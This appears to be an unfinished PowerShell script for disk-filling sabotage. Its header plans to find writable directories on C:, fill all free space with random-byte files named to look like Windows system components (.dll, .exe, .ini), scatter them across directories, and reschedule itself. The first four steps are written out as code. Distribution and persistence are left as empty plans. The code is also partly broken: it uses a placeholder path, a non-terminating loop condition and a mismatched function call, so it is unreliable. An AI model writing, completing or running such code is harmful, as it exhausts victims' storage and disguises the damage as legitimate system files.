# Step 1. Find every writable directory on the C:\ drive and put each path into an array.
# Step 2. Calculate remaining space on the C:\ drive.
# Step 3. Randomize the file names and file extensions by combining parts from four arrays. (i.e. "Windows" "Framework" ".dll").
# Step 4. Create files of random sizes that equal the remaining space.
# Step 5. Distribute each random file into a random directory on the C:\ drive
# Step 6. Create scheduled task to run this script at certain intervals.




# STEP 1
# Find every writable directory on the C:\ drive and put each path into an array.
Function Get-Directories($TargetDrive) {
  $ChildDirectories = Get-ChildItem -Path "<PATH/TO/DIRECTORY>" -Recurse -Directory -Force -ErrorAction SilentlyContinue | Select-Object FullName
  $DirectoriesList = $ChildDirectories.FullName
  return $DirectoriesList
}

# STEP 2
# Calculate remaining space on the C:\ drive.
Function Get-FreeSpace($TargetDrive) {
  $FreeSpace = Get-PSDrive -Name $TargetDrive | Select-Object -Property Free
  $FreeBytes = [int64]$FreeSpace.Free
  $FreeGigabytes = [math]::Round($FreeBytes / 1GB)
  return $FreeGigabytes
}

# STEP 3
# Randomize the file names and file extensions by combining parts from four arrays. (i.e. "Windows" "Framework" ".dll")
Function Set-FileNames() {
  $FileName01 = @('Windows', 'Microsoft', 'WMI') | Get-Random
  $FileName02 = @('Client', 'Server', 'Console', 'Desktop', 'Local', 'Service', 'System') | Get-Random
  $FileName03 = @('Host', 'Network', 'Firewall', 'Diagnostic', 'Policy', 'Agent', 'Antivirus', 'Application', 'Manager', 'Runtime', 'Driver', 'Session', 'Container', 'Process', 'Framework', 'Extension') | Get-Random
  $FileName04 = @('.log', '.exe', '.ini', '.dll', '.dat', '.xml', '.txt') | Get-Random
  $FileNameFull = $FileName01 + $FileName02 + $FileName03 + $FileName04
  return $FileNameFull
}

# STEP 4
# Create files of random sizes that equal the remaining space.
Function Get-RandomFileSize {
  $RandomFileSize = Get-Random -Min 1000 -Max 5000
  $FileSize = $RandomFileSize * 1kb
  return $FileSize
}

Function New-Files($TargetNumber) {
  # Run the New-Files loop UNTIL $TargetNumber = 0
  do {
    $TargetNumber
    $RandomFileName = Set-FileNames
    $ByteLoop = New-Object -TypeName Byte[] -ArgumentList (Get-RandomFileSize)
    $RandomObject = New-Object -TypeName System.Random
    $RandomObject.NextBytes($ByteLoop)
    Set-Content -Path "$RandomFileName" -Value $ByteLoop -Encoding Byte
  } until ($TargetNumber = 0)
}




# STEP 5
# Distribute each random file into a random directory on the C:\ drive


# STEP 0
# Calling the functions.
$TargetDrive = Read-Host "Enter Target Drive Letter"
$TargetNumber = Get-FreeSpace($TargetDrive)
$TargetList = Get-Directories($TargetDrive)
Get-Directories($TargetList)
New-Files($TargetNumber)


